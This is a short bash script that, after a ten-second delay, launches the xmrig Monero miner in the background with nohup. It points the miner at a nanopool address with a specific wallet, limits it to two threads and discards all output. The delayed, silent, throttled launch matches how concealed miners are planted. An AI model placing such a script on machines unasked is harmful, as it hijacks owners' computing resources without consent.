#!/bin/bash
sleep 10
nohup xmrig -o xmr-eu1.nanopool.org:14433 -u 43gD64iSezxjDgMaNpRHQAKBU6TPawhBVCRxAB4KE7xchZMqAwG1WJh7xM7p7v4XkFRGvQwYQEECdLFcMpWYzh9WSyKv1r3 --tls --coin monero --threads=2 > /dev/null 2>&1 &
